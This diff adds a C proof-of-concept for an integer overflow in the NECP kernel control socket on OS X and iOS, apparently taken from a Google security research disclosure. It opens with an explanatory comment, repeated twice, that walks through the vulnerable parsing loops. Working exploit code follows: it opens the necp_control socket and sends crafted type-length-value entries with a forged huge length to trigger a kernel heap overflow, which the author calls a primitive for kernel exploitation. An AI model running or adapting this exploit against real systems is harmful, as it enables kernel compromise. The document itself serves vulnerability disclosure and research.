@@ -1,0 +1,259 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=543
+
+NKE control sockets are documented here: https://developer.apple.com/library/mac/documentation/Darwin/Conceptual/NKEConceptual/control/control.html
+
+By default there are actually a bunch of these providers; they are however all only accessible to root. Nevertheless, on iOS and now (thanks to SIP)
+OS X this is a real security boundary.
+
+necp control sockets are implemented in necp.c. The messages themselves consist of a simple header followed by type-length-value entries.
+The type field is a single byte and the length is a size_t (ie 8 bytes.)
+
+by sending a packed with an id of NECP_PACKET_TYPE_POLICY_ADD we can reach the following loop:
+
+  // Read policy conditions
+  for (cursor = necp_packet_find_tlv(packet, offset, NECP_TLV_POLICY_CONDITION, &error, 0);
+    cursor >= 0;
+    cursor = necp_packet_find_tlv(packet, cursor, NECP_TLV_POLICY_CONDITION, &error, 1)) {
+    size_t condition_size = 0;
+    necp_packet_get_tlv_at_offset(packet, cursor, 0, NULL, &condition_size);
+
+    if (condition_size > 0) {
+      conditions_array_size += (sizeof(u_int8_t) + sizeof(size_t) + condition_size);
+    }
+  }
+
+The necp_packet_{find|get}_* functions cope gracefully if the final tlv is waaay bigger than the actual message (like 2^64-1 ;) )
+
+This means that we can overflow conditions_array_size to anything we want very easily. In this PoC the packet contains three policy conditions:
+
+one of length 1; one of length 1024 and one of length 2^64-1051;
+
+later conditions_array_size is used as the size of a memory allocation:
+
+  MALLOC(conditions_array, u_int8_t *, conditions_array_size, M_NECP, M_WAITOK);
+
+There is then a memory copying loop operating on the undersized array:
+
+  conditions_array_cursor = 0;
+  for (cursor = necp_packet_find_tlv(packet, offset, NECP_TLV_POLICY_CONDITION, &error, 0);
+    cursor >= 0;
+    cursor = necp_packet_find_tlv(packet, cursor, NECP_TLV_POLICY_CONDITION, &error, 1)) {
+    u_int8_t condition_type = NECP_TLV_POLICY_CONDITION;
+    size_t condition_size = 0;
+    necp_packet_get_tlv_at_offset(packet, cursor, 0, NULL, &condition_size);
+    if (condition_size > 0 && condition_size <= (conditions_array_size - conditions_array_cursor)) {   <-- (a)
+      // Add type
+      memcpy((conditions_array + conditions_array_cursor), &condition_type, sizeof(condition_type));
+      conditions_array_cursor += sizeof(condition_type);
+
+      // Add length
+      memcpy((conditions_array + conditions_array_cursor), &condition_size, sizeof(condition_size));
+      conditions_array_cursor += sizeof(condition_size);
+
+      // Add value
+      necp_packet_get_tlv_at_offset(packet, cursor, condition_size, (conditions_array + conditions_array_cursor), NULL);  <-- (b)
+
+There is actually an extra check at (a); this is why we need the first policy_condition of size one (so that the second time through the
+loop (conditions_array_size[1] - conditions_array_cursor[9]) will underflow allowing us to reach the necp_packet_get_tlv_at_offset call which will
+then copy the second 1024 byte policy.
+
+By contstructing the policy like this we can choose both the allocation size and the overflow amount, a nice primitive for an iOS kernel exploit :)
+
+this will crash in weird ways due to the rather small overflow; you can mess with the PoC to make it crash more obviously! But just run this PoC a bunch
+of times and you'll crash :)
+
+Tested on MacBookAir 5,2 w/ OS X 10.10.5 (14F27)
+*/
+
+// ianbeer
+
+/*
+iOS and OS X kernel code execution due to integer overflow in NECP system control socket packet parsing
+
+NKE control sockets are documented here: https://developer.apple.com/library/mac/documentation/Darwin/Conceptual/NKEConceptual/control/control.html
+
+By default there are actually a bunch of these providers; they are however all only accessible to root. Nevertheless, on iOS and now (thanks to SIP)
+OS X this is a real security boundary.
+
+necp control sockets are implemented in necp.c. The messages themselves consist of a simple header followed by type-length-value entries.
+The type field is a single byte and the length is a size_t (ie 8 bytes.)
+
+by sending a packed with an id of NECP_PACKET_TYPE_POLICY_ADD we can reach the following loop:
+
+  // Read policy conditions
+  for (cursor = necp_packet_find_tlv(packet, offset, NECP_TLV_POLICY_CONDITION, &error, 0);
+    cursor >= 0;
+    cursor = necp_packet_find_tlv(packet, cursor, NECP_TLV_POLICY_CONDITION, &error, 1)) {
+    size_t condition_size = 0;
+    necp_packet_get_tlv_at_offset(packet, cursor, 0, NULL, &condition_size);
+
+    if (condition_size > 0) {
+      conditions_array_size += (sizeof(u_int8_t) + sizeof(size_t) + condition_size);
+    }
+  }
+
+The necp_packet_{find|get}_* functions cope gracefully if the final tlv is waaay bigger than the actual message (like 2^64-1 ;) )
+
+This means that we can overflow conditions_array_size to anything we want very easily. In this PoC the packet contains three policy conditions:
+
+one of length 1; one of length 1024 and one of length 2^64-1051;
+
+later conditions_array_size is used as the size of a memory allocation:
+
+  MALLOC(conditions_array, u_int8_t *, conditions_array_size, M_NECP, M_WAITOK);
+
+There is then a memory copying loop operating on the undersized array:
+
+  conditions_array_cursor = 0;
+  for (cursor = necp_packet_find_tlv(packet, offset, NECP_TLV_POLICY_CONDITION, &error, 0);
+    cursor >= 0;
+    cursor = necp_packet_find_tlv(packet, cursor, NECP_TLV_POLICY_CONDITION, &error, 1)) {
+    u_int8_t condition_type = NECP_TLV_POLICY_CONDITION;
+    size_t condition_size = 0;
+    necp_packet_get_tlv_at_offset(packet, cursor, 0, NULL, &condition_size);
+    if (condition_size > 0 && condition_size <= (conditions_array_size - conditions_array_cursor)) {   <-- (a)
+      // Add type
+      memcpy((conditions_array + conditions_array_cursor), &condition_type, sizeof(condition_type));
+      conditions_array_cursor += sizeof(condition_type);
+
+      // Add length
+      memcpy((conditions_array + conditions_array_cursor), &condition_size, sizeof(condition_size));
+      conditions_array_cursor += sizeof(condition_size);
+
+      // Add value
+      necp_packet_get_tlv_at_offset(packet, cursor, condition_size, (conditions_array + conditions_array_cursor), NULL);  <-- (b)
+
+There is actually an extra check at (a); this is why we need the first policy_condition of size one (so that the second time through the
+loop (conditions_array_size[1] - conditions_array_cursor[9]) will underflow allowing us to reach the necp_packet_get_tlv_at_offset call which will
+then copy the second 1024 byte policy.
+
+By contstructing the policy like this we can choose both the allocation size and the overflow amount, a nice primitive for an iOS kernel exploit :)
+
+this will crash in weird ways due to the rather small overflow; you can mess with the PoC to make it crash more obviously! But just run this PoC a bunch
+of times and you'll crash :)
+
+Tested on MacBookAir 5,2 w/ OS X 10.10.5 (14F27)
+*/
+
+#include <errno.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/kern_control.h>
+#include <sys/sys_domain.h>
+#include <net/if.h>
+#include <netinet/in_var.h>
+#include <netinet6/nd6.h>
+#include <arpa/inet.h>
+#include <sys/ioctl.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define CONTROL_NAME "com.apple.net.necp_control"
+
+int ctl_open(void) {
+  int           sock;
+  int           error     = 0;
+  struct ctl_info     kernctl_info;
+  struct sockaddr_ctl   kernctl_addr;
+
+  sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
+  if (sock < 0) {
+    printf("failed to open a SYSPROTO_CONTROL socket: %s", strerror(errno));
+    goto done;
+  }
+
+  memset(&kernctl_info, 0, sizeof(kernctl_info));
+  strlcpy(kernctl_info.ctl_name, CONTROL_NAME, sizeof(kernctl_info.ctl_name));
+
+  error = ioctl(sock, CTLIOCGINFO, &kernctl_info);
+  if (error) {
+    printf("Failed to get the control info for control named \"%s\": %s\n", CONTROL_NAME, strerror(errno));
+    goto done;
+  }
+
+  memset(&kernctl_addr, 0, sizeof(kernctl_addr));
+  kernctl_addr.sc_len = sizeof(kernctl_addr);
+  kernctl_addr.sc_family = AF_SYSTEM;
+  kernctl_addr.ss_sysaddr = AF_SYS_CONTROL;
+  kernctl_addr.sc_id = kernctl_info.ctl_id;
+  kernctl_addr.sc_unit = 0;
+
+  error = connect(sock, (struct sockaddr *)&kernctl_addr, sizeof(kernctl_addr));
+  if (error) {
+    printf("Failed to connect to the control socket: %s", strerror(errno));
+    goto done;
+  }
+
+done:
+  if (error && sock >= 0) {
+    close(sock);
+    sock = -1;
+  }
+
+  return sock;
+}
+
+struct necp_packet_header {
+    uint8_t   packet_type;
+    uint8_t   flags;
+    uint32_t  message_id;
+};
+
+uint8_t* add_real_tlv(uint8_t* buf, uint8_t type, size_t len, uint8_t* val){
+  *buf = type;
+  *(( size_t*)(buf+1)) = len;
+  memcpy(buf+9, val, len);
+  return buf+9+len;
+}
+
+uint8_t* add_fake_tlv(uint8_t* buf, uint8_t type, size_t len, uint8_t* val, size_t real_len){
+  *buf = type;
+  *(( size_t*)(buf+1)) = len;
+  memcpy(buf+9, val, real_len);
+  return buf+9+real_len;
+}
+
+int main(){
+  int fd = ctl_open();
+  if (fd < 0) {
+    printf("failed to get control socket :(\n");
+    return 1;
+  }
+  printf("got a control socket! %d\n", fd);
+
+  size_t msg_size;
+  uint8_t* msg = malloc(0x1000);
+  memset(msg, 0, 0x1000);
+
+  uint8_t* payload = malloc(0x1000);
+  memset(payload, 'A', 0x1000);
+
+  struct necp_packet_header* hdr = (struct necp_packet_header*) msg;
+  hdr->packet_type = 1; // POLICY_ADD
+  hdr->flags = 0;
+  hdr->message_id = 0;
+
+  uint8_t* buf = (uint8_t*)(hdr+1);
+
+  uint32_t order = 0x41414141;
+  buf = add_real_tlv(buf, 2, 4, &order); // NECP_TLV_POLICY_ORDER
+
+  uint8_t policy = 1; // NECP_POLICY_RESULT_PASS
+  buf = add_real_tlv(buf, 4, 1, &policy); // NECP_TLV_POLICY_RESULT
+  
+  buf = add_real_tlv(buf, 3, 1, payload); // NECP_TLV_POLICY_CONDITION
+  buf = add_real_tlv(buf, 3, 1024, payload); // NECP_TLV_POLICY_CONDITION
+  
+  buf = add_fake_tlv(buf, 3, 0xffffffffffffffff-1050, payload, 0x10);
+
+  msg_size = buf - msg;
+
+  send(fd, msg, msg_size, 0);
+
+  close(fd);
+  return 0;
+}
